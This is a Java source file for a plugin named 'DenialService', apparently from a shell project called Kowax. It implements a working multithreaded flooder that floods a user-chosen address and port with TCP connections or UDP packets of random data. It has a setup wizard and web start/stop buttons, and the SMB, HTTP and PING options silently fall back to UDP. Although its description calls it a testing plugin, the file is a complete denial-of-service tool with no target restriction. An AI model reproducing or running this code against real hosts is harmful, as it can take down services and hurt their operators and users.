package com.xspacesoft.kowax.plugins;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Random;

import com.xspacesoft.kowax.apis.KWindow;
import com.xspacesoft.kowax.kernel.PluginBase;
import com.xspacesoft.kowax.kernel.Stdio;
import com.xspacesoft.kowax.shell.CommandRunner;
import com.xspacesoft.kowax.windowsystem.Window;

public class DenialService extends PluginBase implements KWindow {
	
	protected enum DosProtcol {
		TCP,
		UDP,
		SMB,
		HTTP,
		PING,
	}
	
	private String targetAddress;
	private Integer targetPort;
	private Integer threads;
	private DosProtcol dosProtcol;
	private Integer pause;
	private Flooder flooder;

	@Override
	public String getAppletName() {
		return "Dos";
	}

	@Override
	public String getAppletVersion() {
		return "1.0a";
	}

	@Override
	public String getAppletAuthor() {
		return "Kowalski";
	}

	@Override
	protected void runApplet(String command, Stdio stdio, CommandRunner commandRunner) {
		if(command==null) {
			wizard(stdio, commandRunner);
			return;
		}
		String [] commands = command.split(" ");
		switch(commands[0].toLowerCase()) {
		case "start":
			if(this.flooder!=null) {
				this.flooder.start();
				stdio.println("Flood started");
			} else {
				if(createCannon()!=null) {
					flooder = createCannon();
					flooder.start();
					stdio.println("Flood started");
				} else {
					stdio.println("You need to set a target first");
				}
			}
			break;
		case "clear": clearAll();
			break;
		case "stop":
			if((flooder==null)||(!flooder.isRunning())) {
				stdio.println("There is no flooding in progress");
				return;
			} else if (flooder.isRunning()) {
				flooder.stop();
			}
			break;
		case "wizard": wizard(stdio, commandRunner);
		break;
		case "set":
			if(commands.length<3)
				stdio.println("Usage: Dos set (address|port|protocol|threads|pause) value");
			else
				switch(commands[1]) {
				case "ip":
				case "address":
					if(commands[2].contains(":")) {
						String[] userBuffer = commands[2].split(":");
						this.targetAddress = userBuffer[0];
						if(Stdio.isNumber(userBuffer[1])) {
							this.targetPort = Stdio.parseInt(userBuffer[1]);
						} else {
							stdio.println("Invalid port");
						}
					} else {
						this.targetAddress = commands[2];
					}
					break;
				case "port":
					if(Stdio.isNumber(commands[2])) {
						if((Stdio.parseInt(commands[2])>65535)||(Stdio.parseInt(commands[2])<1))
							stdio.println("Invalid port");
						else
							this.targetPort = Stdio.parseInt(commands[2]);
					} else {
						stdio.println("Invalid port");
					}
					break;
				case "threads":
					if(Stdio.isNumber(commands[2])) {
						if((Stdio.parseInt(commands[2])>65535)||(Stdio.parseInt(commands[2])<1))
							stdio.println("Invalid threads number");
						else
							this.threads = Stdio.parseInt(commands[2]);
					} else {
						stdio.println("Invalid threads number");
					}
					break;
				case "protocol":
					if(stringToProtocol(commands[2])!=null) {
						this.dosProtcol = stringToProtocol(commands[2]);
					} else {
						stdio.println("Invalid protocol");
					}
					break;
				default: stdio.println("Usage: Dos set (address|port|protocol|threads|pause) value");
					break;
				}
			if(createCannon()!=null) {
				this.flooder = createCannon();
				stdio.println("Dos: System ready. Usage: Dos start");
			}
			break;
		default: stdio.println(getHint());
			break;
		}
	}

	private void clearAll() {
		if((flooder!=null)&&(flooder.isRunning()))
			flooder.stop();
		this.flooder = null;
		this.targetAddress = null;
		this.targetPort = null;
		this.dosProtcol = null;
		this.threads = null;
		this.pause = null;
	}

	private void wizard(Stdio stdio, CommandRunner commandRunner) {
		stdio.clear();
		stdio.printTitle("Denial Of Service Wizard V" + getAppletVersion());
		stdio.print("Insert target address: ");
		String address = stdio.scan();
		if(address.equalsIgnoreCase("c"))
			return;
		stdio.print("Insert target port: ");
		String bufferPort = stdio.scan();
		while((!Stdio.isNumber(bufferPort))||(Stdio.parseInt(bufferPort)<1)||(Stdio.parseInt(bufferPort)>65536)) {
			if(bufferPort.equalsIgnoreCase("c"))
				return;
			stdio.println("Invalid port!");
			stdio.print("Insert target port: ");
			bufferPort = stdio.scan();
		}
		int port = Stdio.parseInt(bufferPort);
		stdio.print("Insert protocol: ");
		String protocol = stdio.scan();
		while (stringToProtocol(protocol) == null) {
			if(protocol.equalsIgnoreCase("c"))
				return;
			stdio.println("Invalid protocol");
			stdio.print("Insert protocol: ");
			protocol = stdio.scan();
		}
		stdio.print("Insert threads number: ");
		String threadsBuffer = stdio.scan();
		while((!Stdio.isNumber(threadsBuffer))||(Stdio.parseInt(threadsBuffer)<1)||(Stdio.parseInt(threadsBuffer)>65536)) {
			if(threadsBuffer.equalsIgnoreCase("c"))
				return;
			stdio.println("Invalid threads number!");
			stdio.print("Insert threads number: ");
			threadsBuffer = stdio.scan();
		}
		this.targetAddress = address;
		this.targetPort = port;
		this.dosProtcol = stringToProtocol(protocol);
		this.threads = Stdio.parseInt(threadsBuffer);
		this.pause = 0;
		stdio.clear();
		stdio.println("Dos: Setup complete");
		if(createCannon()!=null) {
			this.flooder = createCannon();
			stdio.println("Dos: System ready. Usage: Dos start");
		}
	}
	
	public Flooder createCannon() {
		if(this.targetAddress!=null)
			if(this.targetPort!=null)
				if(this.dosProtcol!=null)
					if(this.threads!=null)
						if(this.pause!=null)
							return new Flooder(targetAddress, targetPort, pause, threads, 1500, dosProtcol);
		return null;
	}

	@Override
	public String getDescription() {
		return "Dos attack testing plugin";
	}

	@Override
	public String getHint() {
		return "Usage: Dos [set|start|stop]";
	}
	
	protected DosProtcol stringToProtocol(String string) {
		switch(string.toLowerCase()) {
		case "stream":
		case "tcp": return DosProtcol.TCP;
		case "datagram":
		case "udp": return DosProtcol.UDP;
		case "samba":
		case "smb": return DosProtcol.SMB;
		case "www":
		case "http": return DosProtcol.HTTP;
		case "ping":
		case "ichmp": return DosProtcol.PING;
		default: return null;
		}
	}
	
	protected class Flooder {
		
		protected FlooderInstance[] flooderInstance;
		
		public Flooder(String address, int port, int wait, int threads, int mtu, DosProtcol protocol) {
			flooderInstance = new FlooderInstance[threads]; 
			switch(protocol) {
			case TCP:
				for (int i = 0; i < flooderInstance.length; i++) {
					flooderInstance[i] = new TcpFlooder(address, port, wait, mtu);
				}
				break;
			case UDP:
				for (int i = 0; i < flooderInstance.length; i++) {
					flooderInstance[i] = new UdpFlooder(address, port, wait, mtu);
				}
				break;
			default:
				for (int i = 0; i < flooderInstance.length; i++) {
					flooderInstance[i] = new UdpFlooder(address, port, wait, mtu);
				}
				break;
			}
		}

		public void start() {
			if(!this.isRunning()) {
				for (int i = 0; i < flooderInstance.length; i++) {
					flooderInstance[i].start();
				}
			}
		}

		public void stop() {
			if(this.isRunning()) {
				for (int i = 0; i < flooderInstance.length; i++) {
					flooderInstance[i].interrupt();
				}
			}
		}

		public boolean isRunning() {
			if(flooderInstance==null)
				return false;
			if(flooderInstance[0]==null)
				return false;
			return flooderInstance[0].isAlive();
		}
		
		public abstract class FlooderInstance extends Thread {
			
			protected String address;
			protected int port;
			private int wait;
			protected int mtu;
			protected String defaultString;
			private String string = "Hi this is a test with soic plugin. Have a nice day! ";
			
			public FlooderInstance(String address, int port, int wait, int mtu) {
				this.address = address;
				this.port = port;
				this.wait = wait;
				this.mtu = mtu;
				this.defaultString = string + generateString();
			}

			private String generateString() {
				char[] buffer = new char[mtu-string.length()];
				Random random = new Random();
				for (int i = 0; i < mtu-string.length(); i++) {
					buffer[i] = (char) random.nextInt();
				}
				return new String(buffer);
			}

			@Override
			public void run() {
				this.setName("DoS Flooder (" + getProtocol() + "@" + targetAddress + ":" + port + ")");
				Boolean running = true;
				while(running) {
					try {
						try {
							flood();
						} catch (IOException e) {
							
						}
						sleep(wait);
					} catch (InterruptedException e) {
						running = false;
					}
				}
			}

			abstract void flood() throws UnknownHostException, IOException;
			abstract String getProtocol(); 
		}
		
		public class TcpFlooder extends FlooderInstance {

			public TcpFlooder(String address, int port, int wait, int mtu) {
				super(address, port, wait, mtu);
			}

			@Override
			void flood() throws UnknownHostException, IOException {
				Socket socket = new Socket(address, port);
				PrintWriter printWriter = new PrintWriter(socket.getOutputStream());
				printWriter.println(super.defaultString);
				socket.close();
			}
			
			@Override
			String getProtocol() {
				return "TCP";
			}
		}
		
		public class UdpFlooder extends FlooderInstance {

			public UdpFlooder(String address, int port, int wait, int mtu) {
				super(address, port, wait, mtu);
			}

			@Override
			void flood() throws UnknownHostException, IOException {
				byte[] message = super.defaultString.getBytes();
				DatagramPacket datagramPacket =
						new DatagramPacket(message, message.length, new InetSocketAddress(address, port));
				DatagramSocket datagramSocket = new DatagramSocket();
				datagramSocket.send(datagramPacket);
				datagramSocket.close();
			}

			@Override
			String getProtocol() {
				return "UDP";
			}
		}
	
	}
	
	private void updateWindow(Window window) {
		createCannon();
		if(window.paramContainsKey("flooderstatus")) {
			try {
				if(window.paramGet("flooderstatus").equals("start")) {
					if (flooder!=null) {
						flooder.start();
					}
				} else if (window.paramGet("flooderstatus").equals("stop")) {
					if (flooder!=null)
						flooder.stop();
				}
			} catch (Exception e) {
				window.setContent(new StringBuilder());
				window.getContent().append("<h4>Error while performing action (" + window.paramGet("flooderstatus") + ")</h4>");
				window.getContent().append("<button onClick='window.location.assign(\"desktop?application=" + getAppletName() + "&flooderstatus=reset\")'>Try DOS reset</button>");
				return;
			}
			if (window.paramGet("flooderstatus").equals("reset")) {
				clearAll();
			}
		}
		try {
			Thread.sleep(1000);
		} catch (InterruptedException e) { }
		window.setContent(new StringBuilder());
		if(flooder!=null&&flooder.isRunning()) {
			window.getContent().append("<h4>Flooder is running</h4>");
			window.getContent().append("Target address: " + this.targetAddress + "<br/>");
			window.getContent().append("Target port: " + this.targetPort + "<br/>");
			window.getContent().append("Target protocol: " + this.dosProtcol + "<br/>");
			window.getContent().append("Running treads: " + this.threads + "<br/>");
			window.getContent().append("<button onClick='window.location.assign(\"desktop?application=" + getAppletName() + "&flooderstatus=stop\")'>Stop flooding</button>");
		} else if(flooder!=null) {
			window.getContent().append("<h4>No flooder is running</h4>");
			window.getContent().append("Target: " + dosProtcol + "@" + targetAddress + ":" 
					+ targetPort + " (" + pause + "ms~" + threads + " thead" + (threads==1 ? "" : "s") + ")" + "<br/>");
			window.getContent().append("<button onClick='window.location.assign(\"desktop?application=" + getAppletName() + "&flooderstatus=start\")'>Start flooding</button>");
		} else if (flooder==null){
			window.getContent().append("<h4>No flooder is configured</h4>");
		}
	}

	@Override
	public void onCreateWindow(Window window) {
		updateWindow(window);
	}

	@Override
	public void onDestroyWindow(Window window) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void onWindowHidden(Window window) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void onWindowResume(Window window) {
		updateWindow(window);
	}	
}
